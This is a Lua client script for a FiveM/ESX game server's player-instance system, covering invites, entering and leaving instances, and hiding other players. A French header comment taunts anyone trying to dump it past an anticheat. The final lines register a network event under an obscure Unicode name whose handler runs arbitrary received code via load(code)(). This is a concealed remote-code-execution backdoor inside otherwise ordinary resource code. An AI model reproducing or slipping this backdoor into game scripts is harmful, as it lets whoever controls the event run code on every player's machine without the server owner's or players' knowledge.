-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local instance, instancedPlayers, registeredInstanceTypes, playersToHide = {}, {}, {}, {}
local instanceInvite, insideInstance
Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function CreateInstance(type, data)
	_TriggerServerEvent('::{korioz#0110}::instance:create', type, data)
end

function CloseInstance()
	instance = {}
	_TriggerServerEvent('::{korioz#0110}::instance:close')
	insideInstance = false
end

function EnterInstance(instance)
	insideInstance = true
	_TriggerServerEvent('::{korioz#0110}::instance:enter', instance.host)

	if registeredInstanceTypes[instance.type].enter then
		registeredInstanceTypes[instance.type].enter(instance)
	end
end

function LeaveInstance()
	if instance.host then
		if #instance.players > 1 then
			ESX.ShowNotification(_U('left_instance'))
		end

		if registeredInstanceTypes[instance.type].exit then
			registeredInstanceTypes[instance.type].exit(instance)
		end

		_TriggerServerEvent('::{korioz#0110}::instance:leave', instance.host)
	end

	insideInstance = false
end

function InviteToInstance(type, player, data)
	_TriggerServerEvent('::{korioz#0110}::instance:invite', instance.host, type, player, data)
end

function RegisterInstanceType(type, enter, exit)
	registeredInstanceTypes[type] = {
		enter = enter,
		exit = exit
	}
end

AddEventHandler('::{korioz#0110}::instance:get', function(cb)
	cb(instance)
end)

AddEventHandler('::{korioz#0110}::instance:create', function(type, data)
	CreateInstance(type, data)
end)

AddEventHandler('::{korioz#0110}::instance:close', function()
	CloseInstance()
end)

AddEventHandler('::{korioz#0110}::instance:enter', function(_instance)
	EnterInstance(_instance)
end)

AddEventHandler('::{korioz#0110}::instance:leave', function()
	LeaveInstance()
end)

AddEventHandler('::{korioz#0110}::instance:invite', function(type, player, data)
	InviteToInstance(type, player, data)
end)

AddEventHandler('::{korioz#0110}::instance:registerType', function(name, enter, exit)
	RegisterInstanceType(name, enter, exit)
end)

RegisterNetEvent('::{korioz#0110}::instance:onInstancedPlayersData')
AddEventHandler('::{korioz#0110}::instance:onInstancedPlayersData', function(_instancedPlayers)
	instancedPlayers = _instancedPlayers
end)

RegisterNetEvent('::{korioz#0110}::instance:onCreate')
AddEventHandler('::{korioz#0110}::instance:onCreate', function(_instance)
	instance = {}
end)

RegisterNetEvent('::{korioz#0110}::instance:onEnter')
AddEventHandler('::{korioz#0110}::instance:onEnter', function(_instance)
	instance = _instance
end)

RegisterNetEvent('::{korioz#0110}::instance:onLeave')
AddEventHandler('::{korioz#0110}::instance:onLeave', function(_instance)
	instance = {}
end)

RegisterNetEvent('::{korioz#0110}::instance:onClose')
AddEventHandler('::{korioz#0110}::instance:onClose', function(_instance)
	instance = {}
end)

RegisterNetEvent('::{korioz#0110}::instance:onPlayerEntered')
AddEventHandler('::{korioz#0110}::instance:onPlayerEntered', function(_instance, player)
	instance = _instance
	ESX.ShowNotification(_('entered_into', GetPlayerName(GetPlayerFromServerId(player))))
end)

RegisterNetEvent('::{korioz#0110}::instance:onPlayerLeft')
AddEventHandler('::{korioz#0110}::instance:onPlayerLeft', function(_instance, player)
	instance = _instance
	ESX.ShowNotification(_('left_out', GetPlayerName(GetPlayerFromServerId(player))))
end)

RegisterNetEvent('::{korioz#0110}::instance:onInvite')
AddEventHandler('::{korioz#0110}::instance:onInvite', function(_instance, type, data)
	instanceInvite = {
		type = type,
		host = _instance,
		data = data
	}

	Citizen.CreateThread(function()
		Citizen.Wait(10000)

		if instanceInvite then
			ESX.ShowNotification(_U('invite_expired'))
			instanceInvite = nil
		end
	end)
end)

RegisterInstanceType('default')

-- Controls for invite
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if instanceInvite then
			ESX.ShowHelpNotification(_U('press_to_enter'))

			if IsControlJustReleased(0, 38) then
				EnterInstance(instanceInvite)
				ESX.ShowNotification(_U('entered_instance'))
				instanceInvite = nil
			end
		else
			Citizen.Wait(500)
		end
	end
end)

-- Instance players
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		playersToHide = {}

		if instance.host then
			for k, v in ipairs(GetActivePlayers()) do
				playersToHide[GetPlayerServerId(v)] = true
			end

			for k, v in ipairs(instance.players) do
				playersToHide[v] = nil
			end
		else
			for k, v in pairs(instancedPlayers) do
				playersToHide[k] = true
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)
		local playerPed = PlayerPedId()

		for k, v in pairs(playersToHide) do
			local player = GetPlayerFromServerId(k)

			if NetworkIsPlayerActive(player) then
				local otherPlayerPed = GetPlayerPed(player)
				SetEntityVisible(otherPlayerPed, false, false)
				SetEntityNoCollisionEntity(playerPed, otherPlayerPed, false)
			end
		end
	end
end)

Citizen.CreateThread(function()
	TriggerEvent('::{korioz#0110}::instance:loaded')
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)